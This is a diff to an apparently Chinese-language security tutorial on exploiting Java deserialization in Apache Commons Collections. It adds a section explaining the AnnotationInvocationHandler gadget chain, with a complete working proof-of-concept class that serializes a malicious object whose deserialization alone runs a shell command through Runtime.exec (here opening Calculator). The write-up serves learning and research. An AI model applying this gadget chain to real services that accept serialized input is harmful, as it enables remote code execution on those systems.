@@ -265,7 +265,7 @@ new InvokerTransformer(
 
 ![image-20220913180215864](images/image-20220913180215864.png)
 
-POC 如下
+POC 如下：
 
 ```java
 package com.serialize;
@@ -397,4 +397,106 @@ public class TransformerTest {
 ![image-20220913183349120](images/image-20220913183349120.png)
 
 相比之前触发反序列化的方式更为容易，当开发者将反序列化的对象转换成`Map`类型之后，通过`put()`、`putAll()`或者`setValue()`对`map`进行操作即可完成命令执行。
+
+## AnnotationInvocationHandler
+
+前面的利用链仍需要服务端进行反序列化转换成`Map`对象，并进行赋值或者修改操作才可以触发命令执行。为了使得我们的攻击`payload`在服务端仅经过反序列化就可以触发，需要寻找新的利用点：`sun.reflect.annotation.AnnotationInvocationHandler`
+
+接下来我们看看`AnnotationInvocationHandler`类的源码，在构造函数中，传进的`Map`类型参数赋值给`memberValues`
+![image-20220914113429062](images/image-20220914113429062.png)
+
+在`readObject()`方法中，对`memberValues`进行遍历，最终当`var7`不为`null`时，通过`setValue()`进行修改操作，因此可以进入前面`TransformedMap`类中的`checkSetValue()`，触发命令执行
+![image-20220914113611289](images/image-20220914113611289.png)
+
+POC 如下：
+```java
+package com.serialize;
+
+import org.apache.commons.collections.Transformer;
+import org.apache.commons.collections.functors.ChainedTransformer;
+import org.apache.commons.collections.functors.ConstantTransformer;
+import org.apache.commons.collections.functors.InvokerTransformer;
+import org.apache.commons.collections.map.TransformedMap;
+
+import java.io.FileInputStream;
+import java.io.FileOutputStream;
+import java.io.ObjectInputStream;
+import java.io.ObjectOutputStream;
+import java.lang.annotation.Target;
+import java.lang.reflect.Constructor;
+import java.util.HashMap;
+import java.util.Map;
+
+/**
+ * Created by dotast on 2022/9/1 10:34
+ */
+public class TransformerTest {
+    public static void main(String[] args) throws Exception {
+        TransformerTest transformerTest = new TransformerTest();
+        transformerTest.serialize();
+        transformerTest.unserialize();
+    }
+
+    /*
+    * 客户端
+    * */
+    public void  serialize() throws Exception{
+        String cmd = "open -a Calculator.app";
+
+        Transformer[] transformers = new Transformer[]{
+                new ConstantTransformer(Runtime.class),
+                // new Class[0]为占位符
+                new InvokerTransformer(
+                        "getMethod",new Class[]{String.class, Class[].class},new Object[]{"getRuntime",new Class[0]}
+                ),
+                new InvokerTransformer(
+                        "invoke",new Class[]{Object.class, Object[].class},new Object[]{null, new Object[0]}
+                ),
+                new InvokerTransformer(
+                        "exec", new Class[]{String.class}, new Object[]{cmd}
+                )
+        };
+        // 创建ChainedTransformer调用链
+        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
+        // 创建Map对象
+        Map<Object, Object> map = new HashMap<>();
+        map.put("value","value");
+        // 调用TransformedMap创建一个含有恶意调用链的Transformer类的Map对象
+        Map transformedMap = TransformedMap.decorate(map, null, chainedTransformer);
+
+        try{
+            // 获取AnnotationInvocationHandler类对象
+            Class cls = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
+            // 获取AnnotationInvocationHandler类的构造方法
+            Constructor constructor = cls.getDeclaredConstructor(Class.class, Map.class);
+            // 设置方法访问权限
+            constructor.setAccessible(true);
+            // 创建含有攻击链的AnnotationInvocationHandler类实例
+            Object instance = constructor.newInstance(Target.class, transformedMap);
+            // 创建并实例化文件输出流
+            FileOutputStream fileOutputStream = new FileOutputStream("1.txt");
+            // 创建并实例化对象输出流
+            ObjectOutputStream out = new ObjectOutputStream(fileOutputStream);
+            out.writeObject(instance);
+
+        }catch (Exception e){
+            e.printStackTrace();
+        }
+
+    }
+
+    /*
+    * 服务端
+    *  */
+    public void unserialize() throws Exception{
+        // 创建并实例化文件输入流
+        FileInputStream fileInputStream = new FileInputStream("1.txt");
+        // 创建并实例化对象输入流
+        ObjectInputStream in = new ObjectInputStream(fileInputStream);
+        Map map = (Map) in.readObject();
+    }
+}	
+```
+
+![image-20220914115903758](images/image-20220914115903758.png)
 
